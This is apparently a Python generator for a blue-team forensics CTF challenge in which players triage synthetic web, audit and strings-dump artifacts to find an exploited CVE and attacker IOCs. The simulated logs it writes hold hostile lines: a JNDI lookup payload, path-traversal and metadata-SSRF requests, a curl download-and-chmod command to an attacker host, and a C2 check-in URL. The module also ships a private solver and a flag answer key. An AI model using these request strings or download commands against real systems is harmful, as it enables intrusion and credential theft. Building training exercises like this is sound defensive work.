"""Deterministic renderer for the ``forensics_incident_triage`` family.

Defensive (blue-team) only: no live service is rendered (``COMPOSE_MARKERS``
is empty). Instead, this module renders a static incident-artifact bundle --
a web-access log, a process/auth log, and a strings-dump of a dropped
payload -- that a player statically analyzes to (1) identify which CVE was
exploited, (2) extract the attacker's IOCs (source IP, user-agent campaign
tag, dropped-file hash), and (3) assemble those IOCs into the flag.

Pure module, mirroring ``templates/tenant_export.py``'s shape and style:
``render()`` is a pure function of ``(spec, rng, cve_record)`` -- no I/O, no
wall-clock, no network. Does NOT import ``families`` (that would be
circular; ``families.py`` imports this module instead).
"""

from __future__ import annotations

import json
import random
from dataclasses import dataclass

from ctf_generator.cve_source import CveRecord
from ctf_generator.models import ChallengeSpec
from ctf_generator.yaml_writer import dump_yaml

# --- Renderer module interface (see families.py FamilyRenderer protocol) ------

FAMILY_NAME = "forensics_incident_triage"
CATEGORY = "forensics"
MODES: tuple[str, ...] = ("blue",)
DIFFICULTIES: tuple[str, ...] = ("easy", "medium", "hard")
CVE_DRIVEN = True
LLM_BRIEF = (
    "Triage a simulated web-service compromise across access, auth, and "
    "payload-strings artifacts to identify the exploited CVE and assemble "
    "the attacker's IOCs into the flag."
)
COMPOSE_MARKERS: tuple[str, ...] = ()
SCORING_HINTS: dict[str, object] = {
    "has_worker": False,
    "has_queue": False,
    "live_interaction": False,
    "decoy_density": "high",
}
REQUIRED_FILES: tuple[str, ...] = (
    "challenge.yaml",
    "public/description.md",
    "public/hints.yaml",
    "public/artifacts/access.log",
    "public/artifacts/auth.log",
    "public/artifacts/dropped_strings.txt",
    "private/solution.md",
    "private/solver.py",
    "private/variant.json",
    "private/checkpoints.yaml",
    "tests/healthcheck.py",
)


# --- Curated fallback exploit catalog (used when no cve_record is passed) -----
#
# (cve_id, cwe_ids, description) tuples. Only used as a deterministic
# fallback so render() still produces a coherent scenario when called
# without a CveRecord (the CVE_DRIVEN=True default path passes one).
_FALLBACK_CVES: tuple[tuple[str, list[str], str], ...] = (
    (
        "CVE-2021-44228",
        ["CWE-502", "CWE-400", "CWE-20"],
        "Apache Log4j2 JNDI lookup remote code execution (Log4Shell).",
    ),
    (
        "CVE-2019-11510",
        ["CWE-22"],
        "Pulse Connect Secure unauthenticated arbitrary file read.",
    ),
    (
        "CVE-2021-22986",
        ["CWE-918"],
        "F5 BIG-IP iControl REST SSRF and unauthenticated RCE.",
    ),
)

# Distractor pool for the decoy WAF alert: a second, unrelated CVE id that
# appears in access.log but never correlates with auth.log or the dropped
# payload -- so the player must corroborate across artifacts rather than
# grep for the first "CVE-" string they find.
_DECOY_CVES: tuple[str, ...] = (
    "CVE-2017-5638",
    "CVE-2020-1472",
    "CVE-2017-0144",
    "CVE-2014-0160",
)

_DROPPED_FILENAMES: tuple[str, ...] = (
    "update_cache.elf",
    "sys_diag.bin",
    "cron_sync.sh",
    "kworker_helper",
    "svc_healthcheck.bin",
)

_VICTIM_HOSTS: tuple[str, ...] = (
    "web-prod-01",
    "edge-app-03",
    "svc-gateway-02",
    "app-node-07",
)

_ANALYST_HANDLES: tuple[str, ...] = (
    "nia.chen",
    "omar.said",
    "priya.nair",
    "evan.brooks",
)

_PARENT_PROCESSES: tuple[str, ...] = ("nginx", "apache2", "gunicorn", "envoy")

_DECOY_SCAN_PATHS: tuple[str, ...] = (
    "/wp-login.php",
    "/.env",
    "/phpmyadmin/index.php",
    "/.git/config",
    "/xmlrpc.php",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
)

_STRINGS_NOISE: tuple[str, ...] = (
    "GLIBC_2.2.5",
    "libc.so.6",
    "__libc_start_main",
    "PTRhh",
    "/lib64/ld-linux-x86-64.so.2",
    "GCC: (Debian 12.2.0-14) 12.2.0",
    ".note.ABI-tag",
    "malloc(): invalid size",
)


@dataclass(frozen=True)
class Variant:
    incident_id: str
    analyst_handle: str
    victim_host: str
    attacker_ip: str
    decoy_ip: str
    campaign_tag: str
    dropped_filename: str
    dropped_hash: str
    cve_id: str
    cve_description: str
    decoy_cve_id: str
    exploit_path: str
    exploit_marker: str
    process_name: str
    parent_process: str
    base_time: str
    flag: str


def render(
    spec: ChallengeSpec,
    rng: random.Random,
    cve_record: "CveRecord | None" = None,
) -> dict[str, str]:
    variant = _variant(rng, cve_record)

    public_hints = [
        {
            "level": 1,
            "text": "Start with public/artifacts/access.log -- one request stands out from routine scanner noise.",
        },
        {
            "level": 2,
            "text": "There is more than one CVE reference in the logs. Only one is corroborated by the other two artifacts.",
        },
        {
            "level": 3,
            "text": "Correlate the source IP across access.log and auth.log, then pull the payload hash from dropped_strings.txt.",
        },
        {
            "level": 4,
            "text": "Flag format: ctf{<cve-id-lowercase>_<last octet of the corroborated attacker IP>_<first 12 hex chars of the dropped-file sha256>}",
        },
    ]

    files = {
        "public/description.md": _description(spec, variant),
        "public/hints.yaml": dump_yaml({"hints": public_hints}),
        "public/artifacts/access.log": _access_log(rng, variant),
        "public/artifacts/auth.log": _auth_log(rng, variant),
        "public/artifacts/dropped_strings.txt": _dropped_strings(rng, variant),
        "private/solution.md": _solution(variant),
        "private/solver.py": _solver(),
        "private/variant.json": _variant_json(spec, variant),
        "private/checkpoints.yaml": dump_yaml(
            {"checkpoints": [{"name": name, "required": True} for name in spec.checkpoints]}
        ),
        "tests/healthcheck.py": _healthcheck(),
    }
    return files


# --- Variant construction ----------------------------------------------------


def _token_hex(rng: random.Random, byte_count: int) -> str:
    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()


def _select_cve(
    rng: random.Random, cve_record: "CveRecord | None"
) -> tuple[str, list[str], str]:
    if cve_record is not None:
        return cve_record.cve_id, list(cve_record.cwe_ids), cve_record.description
    cve_id, cwe_ids, description = rng.choice(_FALLBACK_CVES)
    return cve_id, list(cwe_ids), description


def _exploit_signature(cwe_ids: list[str], attacker_ip: str, dropped_filename: str) -> tuple[str, str]:
    """Return ``(request_path, marker)`` for the given CWE class.

    ``marker`` is a short human label used in log commentary; it plays no
    role in flag derivation (that comes from the WAF alert's ``signature``
    field, IP correlation, and the dropped-file hash) so this stays
    meaningful even when handed an arbitrary CVE's CWE list.
    """
    primary = cwe_ids[0] if cwe_ids else ""
    if primary == "CWE-22":
        return "/../../../../../../etc/passwd%00.png", "path-traversal"
    if primary == "CWE-918":
        return (
            "/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "ssrf",
        )
    if primary in ("CWE-502", "CWE-400", "CWE-20"):
        return f"/api/lookup?ref=${{jndi:ldap://{attacker_ip}:1389/Exploit}}", "deserialization"
    if primary == "CWE-434":
        return f"/upload?file={dropped_filename}", "unrestricted-upload"
    if primary in ("CWE-798", "CWE-287", "CWE-306"):
        return "/admin/console;/login.jsp?bypass=true", "auth-bypass"
    return "/admin/console;/login.jsp?cmd=whoami", "generic-rce"


def _variant(rng: random.Random, cve_record: "CveRecord | None") -> Variant:
    incident_id = f"INC-{rng.randrange(1000, 9999)}"
    analyst_handle = rng.choice(_ANALYST_HANDLES)
    victim_host = rng.choice(_VICTIM_HOSTS)
    attacker_ip = f"{rng.choice(['203.0.113', '198.51.100', '192.0.2'])}.{rng.randrange(2, 254)}"
    decoy_ip = f"{rng.choice(['203.0.113', '198.51.100', '192.0.2'])}.{rng.randrange(2, 254)}"
    while decoy_ip == attacker_ip:
        decoy_ip = f"{rng.choice(['203.0.113', '198.51.100', '192.0.2'])}.{rng.randrange(2, 254)}"
    campaign_tag = _token_hex(rng, 3)
    dropped_filename = rng.choice(_DROPPED_FILENAMES)
    dropped_hash = _token_hex(rng, 32)
    cve_id, cwe_ids, cve_description = _select_cve(rng, cve_record)
    decoy_cve_id = rng.choice([c for c in _DECOY_CVES if c != cve_id])
    exploit_path, exploit_marker = _exploit_signature(cwe_ids, attacker_ip, dropped_filename)
    process_name = dropped_filename
    parent_process = rng.choice(_PARENT_PROCESSES)
    month = rng.randint(1, 12)
    day = rng.randint(1, 28)
    hour = rng.randint(0, 23)
    minute = rng.randint(0, 59)
    second = rng.randint(0, 59)
    base_time = f"2024-{month:02d}-{day:02d}T{hour:02d}:{minute:02d}:{second:02d}Z"

    flag = f"ctf{{{cve_id.lower()}_{attacker_ip.rsplit('.', 1)[-1]}_{dropped_hash[:12]}}}"

    return Variant(
        incident_id=incident_id,
        analyst_handle=analyst_handle,
        victim_host=victim_host,
        attacker_ip=attacker_ip,
        decoy_ip=decoy_ip,
        campaign_tag=campaign_tag,
        dropped_filename=dropped_filename,
        dropped_hash=dropped_hash,
        cve_id=cve_id,
        cve_description=cve_description,
        decoy_cve_id=decoy_cve_id,
        exploit_path=exploit_path,
        exploit_marker=exploit_marker,
        process_name=process_name,
        parent_process=parent_process,
        base_time=base_time,
        flag=flag,
    )


# --- Artifact rendering --------------------------------------------------------


def _bump(base_time: str, seconds: int) -> str:
    """Add ``seconds`` to an ISO-8601 ``...THH:MM:SSZ`` timestamp, no wraparound.

    Deliberately simple (no calendar arithmetic): seconds/minutes/hours are
    incremented and allowed to exceed their natural range (e.g. ``:71`` or
    ``T25:``), which is fine for a synthetic log artifact that is only ever
    read for relative ordering, never parsed as a real clock.
    """
    date_part, time_part = base_time[:-1].split("T")
    hour, minute, sec = (int(part) for part in time_part.split(":"))
    sec += seconds
    minute += sec // 60
    sec %= 60
    hour += minute // 60
    minute %= 60
    return f"{date_part}T{hour:02d}:{minute:02d}:{sec:02d}Z"


def _access_log(rng: random.Random, v: Variant) -> str:
    lines: list[str] = []
    decoy_ip_pool = [f"192.0.2.{rng.randrange(2, 254)}" for _ in range(3)]
    for offset, (ip, path) in enumerate(zip(decoy_ip_pool, _DECOY_SCAN_PATHS)):
        ts = _bump(v.base_time, -600 + offset * 5)
        lines.append(
            f'{ip} - - [{ts}] "GET {path} HTTP/1.1" 404 154 "-" "Mozilla/5.0 (compatible; scanbot/2.1)"'
        )

    exploit_ts = v.base_time
    exploit_ua = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 obscura-{v.campaign_tag}/1.4"
    lines.append(
        f'{v.attacker_ip} - - [{exploit_ts}] "GET {v.exploit_path} HTTP/1.1" 200 812 "-" "{exploit_ua}"'
    )
    lines.append(
        f'# waf-alert: signature="{v.cve_id}" category="{v.exploit_marker}" '
        f'desc="{v.cve_description[:70]}" src={v.attacker_ip} host={v.victim_host} action=logged-only'
    )

    decoy_ts = _bump(v.base_time, 42)
    decoy_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) scanner/9.0"
    lines.append(
        f'{v.decoy_ip} - - [{decoy_ts}] "GET /admin/console;/login.jsp?cmd=id HTTP/1.1" 403 211 "-" "{decoy_ua}"'
    )
    lines.append(
        f'# waf-alert: signature="{v.decoy_cve_id}" category="probe" '
        f'desc="blocked automated probe, no follow-on activity observed" src={v.decoy_ip} host={v.victim_host} action=blocked'
    )

    tail_ts = _bump(v.base_time, 90)
    lines.append(
        f'{v.attacker_ip} - - [{tail_ts}] "GET /favicon.ico HTTP/1.1" 200 318 "-" "{exploit_ua}"'
    )

    return "\n".join(lines) + "\n"


def _auth_log(rng: random.Random, v: Variant) -> str:
    del rng
    lines: list[str] = []
    boot_ts = _bump(v.base_time, -900)
    lines.append(
        f"{boot_ts} {v.victim_host} systemd[1]: Started {v.parent_process}.service - reverse proxy."
    )
    spawn_ts = _bump(v.base_time, 3)
    lines.append(
        f'type=EXECVE msg=audit({spawn_ts}): argc=3 a0="/bin/sh" a1="-c" '
        f'a2="curl -fsSL http://{v.attacker_ip}/dl/{v.dropped_filename} -o /tmp/{v.dropped_filename} '
        f'&& chmod +x /tmp/{v.dropped_filename}" comm="sh" pid=18422 ppid=1188 uid=www-data '
        f'exe="/usr/sbin/{v.parent_process}"'
    )
    exec_ts = _bump(v.base_time, 6)
    lines.append(
        f'type=EXECVE msg=audit({exec_ts}): argc=1 a0="/tmp/{v.dropped_filename}" '
        f'comm="{v.process_name}" pid=18430 ppid=18422 uid=www-data exe="/tmp/{v.dropped_filename}"'
    )
    net_ts = _bump(v.base_time, 7)
    lines.append(
        f"{net_ts} {v.victim_host} kernel: [audit] outbound connection pid=18430 "
        f"comm=\"{v.process_name}\" dst={v.attacker_ip} dport=4444 proto=tcp ACCEPT"
    )
    quiet_ts = _bump(v.base_time, 300)
    lines.append(
        f"{quiet_ts} {v.victim_host} sshd[19011]: Accepted publickey for {v.analyst_handle} "
        f"from 10.20.0.14 port 51422 ssh2"
    )
    return "\n".join(lines) + "\n"


def _dropped_strings(rng: random.Random, v: Variant) -> str:
    noise = list(_STRINGS_NOISE)
    rng.shuffle(noise)
    lines = [
        f"# extracted strings from /tmp/{v.dropped_filename}",
        *noise[:4],
        f"campaign={v.campaign_tag}",
        f"c2=http://{v.attacker_ip}:4444/checkin",
        "connect back failed, retrying in %d seconds",
        *noise[4:],
        f"BUILD_MANIFEST sha256:{v.dropped_hash}",
    ]
    return "\n".join(lines) + "\n"


def _description(spec: ChallengeSpec, v: Variant) -> str:
    return f"""# {spec.title}

Incident `{v.incident_id}` was opened after `{v.victim_host}` started making
unexpected outbound connections. You are the on-call analyst (`{v.analyst_handle}`).
Three artifacts were pulled from the host during containment:

- `public/artifacts/access.log` -- the web server's access log
- `public/artifacts/auth.log` -- process execution / auth events (`auditd`-style)
- `public/artifacts/dropped_strings.txt` -- a `strings` dump of a payload the
  attacker dropped to `/tmp`

## Your task

1. Identify **which CVE** was actually exploited. The access log references
   more than one CVE signature -- only one is corroborated by activity in
   the other two artifacts.
2. Extract the attacker's IOCs: their source IP address, and the SHA-256
   hash of the dropped payload.
3. Assemble the flag:

   `ctf{{<cve-id-lowercase>_<last octet of the corroborated attacker IP>_<first 12 hex chars of the dropped-file sha256>}}`

This challenge is generated as a static, offline forensics variant: no
service needs to be started, and no network access is required or expected.
Exact IPs, filenames, hashes, and the specific CVE referenced may differ
across generated instances.
"""


def _solution(v: Variant) -> str:
    return f"""# Private Solution

## Ground truth

- Exploited CVE: `{v.cve_id}` ({v.cve_description})
- Attacker IP: `{v.attacker_ip}`
- Decoy CVE (red herring, blocked probe, uncorrelated IP): `{v.decoy_cve_id}` from `{v.decoy_ip}`
- Dropped payload: `{v.dropped_filename}`, `sha256:{v.dropped_hash}`
- Campaign tag: `{v.campaign_tag}`

## Triage path

1. `access.log` contains two `# waf-alert` lines, each citing a different
   CVE signature. The alert for `{v.decoy_cve_id}` was `action=blocked` and
   its source IP (`{v.decoy_ip}`) never appears again anywhere else -- it is
   noise, a routine automated probe.
2. The alert for `{v.cve_id}` was `action=logged-only` (i.e. it succeeded)
   from `{v.attacker_ip}`, immediately following a 200-status request to
   `{v.exploit_path}`.
3. `auth.log` shows an `EXECVE` event a few seconds later: `sh -c "curl ...
   http://{v.attacker_ip}/dl/{v.dropped_filename} -o /tmp/{v.dropped_filename}
   && chmod +x ..."`, followed by execution of `/tmp/{v.dropped_filename}` and
   an outbound connection back to `{v.attacker_ip}`. This corroborates
   `{v.attacker_ip}` (not `{v.decoy_ip}`) as the real attacker source, and
   `{v.cve_id}` as the real exploited CVE.
4. `dropped_strings.txt` contains `BUILD_MANIFEST sha256:{v.dropped_hash}`
   for the payload named in the `auth.log` `EXECVE` events.
5. Assemble: `ctf{{{v.cve_id.lower()}_{v.attacker_ip.rsplit('.', 1)[-1]}_{v.dropped_hash[:12]}}}`

Expected flag: `{v.flag}`

This is meant to teach IOC correlation across independent artifact sources
(don't trust a single log line in isolation), not just pattern-matching for
the string "CVE-".
"""


def _variant_json(spec: ChallengeSpec, v: Variant) -> str:
    return json.dumps(
        {
            "meta": spec.meta_mapping(),
            "family": FAMILY_NAME,
            "artifacts": {
                "access_log": "public/artifacts/access.log",
                "auth_log": "public/artifacts/auth.log",
                "dropped_strings": "public/artifacts/dropped_strings.txt",
            },
            "access": {
                "siem_login": f"{v.analyst_handle}@soc.local",
                "siem_case_id": v.incident_id,
            },
            "tokens": {
                "incident_id": v.incident_id,
                "analyst_handle": v.analyst_handle,
                "victim_host": v.victim_host,
                "attacker_ip": v.attacker_ip,
                "decoy_ip": v.decoy_ip,
                "campaign_tag": v.campaign_tag,
                "dropped_filename": v.dropped_filename,
                "dropped_hash": v.dropped_hash,
                "cve_id": v.cve_id,
                "decoy_cve_id": v.decoy_cve_id,
                "process_name": v.process_name,
                "parent_process": v.parent_process,
            },
            "flag": v.flag,
        },
        indent=2,
        sort_keys=True,
    ) + "\n"


def _solver() -> str:
    return '''from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path

WAF_ALERT_RE = re.compile(
    r'# waf-alert: signature="(CVE-\\d{4}-\\d{4,})".*?src=(\\S+).*?action=(\\S+)'
)
EXECVE_DROP_RE = re.compile(r"-o /tmp/(\\S+?)(?:\\s|\\")")
SHA256_RE = re.compile(r"sha256:([0-9a-f]{64})")


def analyze(artifacts_dir: Path) -> str:
    access_log = (artifacts_dir / "access.log").read_text(encoding="utf-8")
    auth_log = (artifacts_dir / "auth.log").read_text(encoding="utf-8")
    strings_dump = (artifacts_dir / "dropped_strings.txt").read_text(encoding="utf-8")

    candidates = WAF_ALERT_RE.findall(access_log)
    if not candidates:
        raise RuntimeError("no waf-alert signatures found in access.log")

    corroborated = None
    for cve_id, ip, _action in candidates:
        # A real intrusion's source IP shows up independently in auth.log
        # (process spawn / outbound connection evidence); a blocked probe's
        # IP does not.
        if re.search(re.escape(ip), auth_log):
            corroborated = (cve_id, ip)
            break
    if corroborated is None:
        raise RuntimeError("no waf-alert IP corroborated by auth.log activity")
    cve_id, attacker_ip = corroborated

    drop_match = EXECVE_DROP_RE.search(auth_log)
    if not drop_match:
        raise RuntimeError("could not find dropped filename in auth.log")

    hash_match = SHA256_RE.search(strings_dump)
    if not hash_match:
        raise RuntimeError("could not find sha256 in dropped_strings.txt")
    dropped_hash = hash_match.group(1)

    last_octet = attacker_ip.rsplit(".", 1)[-1]
    return f"ctf{{{cve_id.lower()}_{last_octet}_{dropped_hash[:12]}}}"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--artifacts-dir", default="public/artifacts")
    args = parser.parse_args()
    flag = analyze(Path(args.artifacts_dir))
    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def _healthcheck() -> str:
    return '''from __future__ import annotations

import argparse
import sys
from pathlib import Path

REQUIRED_MARKERS = {
    "access.log": "# waf-alert",
    "auth.log": "EXECVE",
    "dropped_strings.txt": "sha256:",
}


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--artifacts-dir", default="public/artifacts")
    args = parser.parse_args()
    artifacts_dir = Path(args.artifacts_dir)

    for filename, marker in REQUIRED_MARKERS.items():
        path = artifacts_dir / filename
        assert path.exists(), f"missing artifact: {filename}"
        text = path.read_text(encoding="utf-8")
        assert text.strip(), f"empty artifact: {filename}"
        assert marker in text, f"artifact {filename} missing expected marker {marker!r}"

    print("ok")
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''
